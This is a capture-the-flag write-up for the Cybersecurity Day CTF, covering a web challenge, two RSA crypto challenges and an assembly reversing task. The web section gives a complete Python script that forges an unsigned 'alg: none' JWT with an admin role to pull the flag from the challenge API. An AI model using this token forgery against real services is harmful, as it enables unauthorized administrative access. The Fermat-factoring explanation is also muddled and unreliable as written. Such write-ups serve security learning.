---
title: Cybersecurity Day CTF
published: 2024-11-12
description: Solving CSD CTF challenges
image: "./img.jpeg"
tags: [CSD ,INSEC, CTF]
category: CTF
draft: false
---

First, I’d like to thank the organizers, INSEC and Cyberforces, for putting together this amazing event. Your hard work and dedication made it possible for us to challenge ourselves, learn, and grow. I appreciate the opportunity to participate, and I’m grateful for all the effort that went into making this CTF even we didn't make it to the top 5.

## Web
### Apisa

It was fun challenge i got the first blood on it

![image](https://github.com/user-attachments/assets/572fb487-3463-423c-848d-19006c9a0aa0)


so let's start with searching for potentiel vulnerbilities
1. JWT Token Vulnerabilities:
   - The code accepts `alg: none` in the JWT header
   - There are specific header requirements that we can satisfy:
     - `typ` must contain "Why do pirates use HMAC?"
     - `alg` can be 'none'
     - `kid` must split into ["What's", "a", "pirate's", "favorite", "hash?"]

2. Token Verification:
   - The timestamp verification has a specific XOR condition
   - The code will accept tokens with no signature if the algorithm is set to 'none'

3. Request Requirements:
   - Needs specific headers: X-Request-Timestamp, X-API-Version, X-Content-Hash
   - The body must contain specific fields to get the flag:
     - action: "read"
     - resource: "document"
     - options.type: "admin"

so we need to :
1. Creates a forged JWT token with 'none' algorithm and required headers
2. Sets up the proper request body to retrieve the flag
3. Calculates the correct content hash
4. Sends the request with all required headers

Taking all this informations we can 
```python
import requests
import jwt
import json
import time
import base64
import hashlib

BASE_URL = "https://apisa.snakeeyes-blogs.xyz"

def create_forged_token():
    # Crafting the JWT header with required fields based on treasure_map conditions
    header = {
        'typ': 'Why do pirates use HMAC?',
        'alg': 'none',
        'kid': "What's a pirate's favorite hash?"
    }
    timestamp = str(int(time.time()))
    payload = {
        'role': 'admin',
        'timestamp': timestamp
    }
    token = jwt.encode(payload, None, algorithm='none', headers=header)
    return token, timestamp

def create_request_body():
    body = {
        'action': 'read',
        'resource': 'document',
        'options': {
            'type': 'admin'
        }
    }
    return body
    
def exploit():
    token, timestamp = create_forged_token()
    body = create_request_body()
    body_hash = hashlib.sha256(json.dumps(body, sort_keys=True).encode()).hexdigest()
    
    # Prepare headers
    headers = {
        'Authorization': f'Bearer {token}',
        'X-Request-Timestamp': timestamp,
        'X-API-Version': '1.0',
        'X-Content-Hash': body_hash,
        'Content-Type': 'application/json'
    }
    
    response = requests.post(f"{BASE_URL}/api/request", json=body, headers=headers)
    
    print(f"Response status: {response.status_code}")
    print(f"Response body: {response.json()}")

if __name__ == "__main__":
    exploit()
```

## Crypto
### Primable

This RSA challenge provides us with \( n \), the ciphertext, and \( e \). We need to determine the values of \( p \) and \( q \), which are close to each other.

We can use Fermat's factorization method:

Given \( n = p * q \), we know:

$$ 
n = \left( \frac{p+q}{2} \right)^2 - \left( \frac{p-q}{2} \right)^2 
$$

Since \( p \) and \( q \) are close, we define:


$\left( s = \frac{p+q}{2} \right)$ and $\left( t = \frac{p-q}{2} \right)$


So,

$$ 
n = s^2 - t^2 
$$

We can start with an approximation:

1. Begin with $t = \sqrt{n}$.
2. Increment \( t \) until we find that \( t \) is a prime number.
3. Then, calculate $s^2 = t^2 - n$ to see if it’s a perfect square.

Finally, we retrieve p and q :

$$ 
p = t + s, \quad q = t - s 
$$

![image](https://github.com/user-attachments/assets/a0b1b949-6e2a-411e-8521-46f0e8f41642)


```python
from Crypto.Util.number import isPrime, long_to_bytes
import gmpy2

def find_close_prime_bits(n):
    nlen = n.bit_length()
    approx_p = gmpy2.isqrt(n)
    p_candidate = approx_p
    step = 2**499
    
    while True:
        if n % p_candidate == 0:
            q_candidate = n // p_candidate
            if isPrime(p_candidate) and isPrime(q_candidate):
                return p_candidate, q_candidate
        p_candidate -= 1
        if p_candidate < approx_p - 10000:
            return None, None

n = 27648324383538704058526126064664874691917638403593991242489099137877576182768193643164934381927043193856407292824729622322951353990162721990529414343175377852857689274876201528662203124227485748672303062548126194441400835928481251587783134278074665746682970354712955578800278168532406775145550549727181618513338094567283014138173235068565828630064627353801520155836164622254499802383985552509948534078768150613256802530977549344858089086996803357098914388837521106054470532422789702875346806977904108902499915266266843564027887867480322537174346831594998659778047946239498558452563855743282753795196712406941340754551
e = 65537
c = 9013202925065684070284841096480034269882027628943152855208546857010316985176266380397714875901900820872886282115581264047981875170433324913458226606527330409663329601662960933836912615694949924944870804124552068592191193943526880632558626966094512796349832518345976496505072320957237056737176454945433149265875627762284702122475079751393161965729384333290123132213399055830217995916760986963211627560382329645027957377120781321163281732645494865537740896992456565056475865865221936753646422406435059365634542991935340719834134651261396813436686353015517906742263356658539068832228410725229853185341484070961072296856

p, q = find_close_prime_bits(n)
print(f"Found p: {p}")
print(f"Found q: {q}")

if p and q:
    phi = (p - 1) * (q - 1)
    d = pow(e, -1, phi)
    m = pow(c, d, n)
    try:
        flag = long_to_bytes(m).decode()
        print(f"Flag: {flag}")
    except:
        print("Error decoding message")
else:
    print("Failed to find prime factors")
```

### Chinesse (i dont remember the name XD)
solving the challenge using seed 2000 because its the length of hint table
we need to get e using Chinesse Reminder theoreme

```python
from sympy.ntheory.modular import crt

ll = []  # list of random integers generated with the given seed (2000)
hints =  []  # the hints provided, each hint[i] = e % ll[i]

e, _ = crt(ll, hints)
print(f"e = {e}")
```

now after we have N, C et e we can use dcode to solve the challenge
![image](https://github.com/user-attachments/assets/3990605a-3bba-4338-9ae4-32375c086cc2)


## Rev
### asm

We have assembly chall so we need to follow what the script do to get the flag

```python
import struct

flag = bytearray("INSEC{".encode() + b'\x00' * 12 + b'}\x00')

value1 = 1870225259  # 0x6FA16FEB
flag[6:10] = struct.pack('<I', value1)

value2 = 3738091242  # 0xDEE0C24A
rotated_value2 = ((value2 >> 1) | (value2 << 31)) & 0xFFFFFFFF  # Rotate right by 1
flag[10:14] = struct.pack('<I', rotated_value2)

value3 = 2342557323  # 0x8B9E52DB
flipped_value3 = value3 ^ 0xFFFFFFFF  # XOR with 0xFFFFFFFF
bswapped_value3 = struct.unpack("<I", struct.pack(">I", flipped_value3))[0]  # Byte-swap
flag[14:18] = struct.pack('<I', bswapped_value3)

final_flag = flag.decode('latin1') 
print("Flag:", final_flag)
```
